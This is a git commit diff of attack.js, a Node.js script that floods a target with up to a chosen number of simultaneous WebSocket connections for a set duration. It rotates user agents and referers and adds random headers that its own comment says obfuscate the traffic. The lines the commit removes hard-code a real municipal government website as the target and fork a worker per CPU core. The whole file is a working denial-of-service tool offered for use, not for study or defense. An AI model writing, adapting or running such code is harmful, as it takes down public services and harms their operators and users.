a415ccbd88568436743e92bbec518d98a71e4ed0
divisaofederal <166842966+divisaofederal@users.noreply.github.com>
2024-04-13 04:09:48 -0300

    Update attack.js

--- attack.js
+++ attack.js
@@ -1,6 +1,5 @@
 const WebSocket = require('ws');
-const cluster = require('cluster');
-const numCPUs = require('os').cpus().length;
+const crypto = require('crypto');
 
 const userAgents = [
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
@@ -9,7 +8,10 @@ const userAgents = [
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36',
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36',
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0',
-  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0'
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0',
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36',
+  'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36',
+  'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15'
 ];
 
 const referers = [
@@ -19,61 +21,60 @@ const referers = [
   'http://www.ask.com',
   'http://www.duckduckgo.com',
   'http://www.baidu.com',
-  'http://www.yandex.ru'
+  'http://www.yandex.ru',
+  'http://www.facebook.com',
+  'http://www.twitter.com',
+  'http://www.instagram.com',
+  'http://www.linkedin.com',
+  'http://www.pinterest.com',
+  'http://www.reddit.com',
+  'http://www.tumblr.com'
 ];
 
 const getRandomElement = (array) => array[Math.floor(Math.random() * array.length)];
 
-if (cluster.isMaster) {
-  console.log(`Master ${process.pid} is running`);
-
-  // Fork workers
-  for (let i = 0; i < numCPUs; i++) {
-    cluster.fork();
-  }
-
-  cluster.on('exit', (worker, code, signal) => {
-    console.log(`worker ${worker.process.pid} died`);
-  });
-} else {
-  console.log(`Worker ${process.pid} started`);
-
-  const targetUrl = 'https://www.guaruja.sp.gov.br/'; // URL do alvo
-  const attackDuration = 600000; // Duração do ataque em milissegundos (600 segundos)
-  const requestInterval = 100; // Intervalo entre as requisições em milissegundos (0.1 segundo)
-  let requestCount = 0;
-  let activeWebSockets = 0;
-  const maxWebSockets = 1014; // Número máximo de WebSockets simultâneos
-
-  const attack = setInterval(() => {
-    if (Date.now() - startTime < attackDuration) {
-      if (activeWebSockets < maxWebSockets) {
-        const ws = new WebSocket(targetUrl, {
-          headers: {
-            'User-Agent': getRandomElement(userAgents),
-            'Referer': getRandomElement(referers)
-          }
-        });
-
-        ws.on('open', () => {
-          requestCount++;
-          activeWebSockets++;
-        });
-
-        ws.on('error', (err) => {
-          console.error(`Erro na conexão: ${err.message}`);
-        });
-
-        ws.on('close', () => {
-          activeWebSockets--;
-        });
-      }
-    } else {
-      console.log(`Ataque encerrado. Total de conexões: ${requestCount}`);
-      clearInterval(attack);
-      process.exit();
-    }
-  }, requestInterval);
-
-  const startTime = Date.now();
+if (process.argv.length < 5) {
+  console.log('Usage: node attack.js <url> <duration> <WebSockets>');
+  process.exit(1);
 }
+
+const targetUrl = process.argv[2];
+const attackDuration = parseInt(process.argv[3]) * 1000; // convertendo para milissegundos
+const maxWebSockets = parseInt(process.argv[4]);
+
+let requestCount = 0;
+let activeWebSockets = 0;
+
+const attack = setInterval(() => {
+  if (Date.now() - startTime < attackDuration) {
+    if (activeWebSockets < maxWebSockets) {
+      const ws = new WebSocket(targetUrl, {
+        headers: {
+          'User-Agent': getRandomElement(userAgents),
+          'Referer': getRandomElement(referers),
+          'Sec-WebSocket-Key': crypto.randomBytes(16).toString('base64'), // Adiciona um header aleatório para ofuscar o tráfego
+          'Sec-WebSocket-Version': '13' // Versão do protocolo WebSocket
+        }
+      });
+
+      ws.on('open', () => {
+        requestCount++;
+        activeWebSockets++;
+      });
+
+      ws.on('error', (err) => {
+        console.error(`Erro na conexão: ${err.message}`);
+      });
+
+      ws.on('close', () => {
+        activeWebSockets--;
+      });
+    }
+  } else {
+    console.log(`Ataque encerrado. Total de conexões: ${requestCount}`);
+    clearInterval(attack);
+    process.exit();
+  }
+}, 100);
+
+const startTime = Date.now();
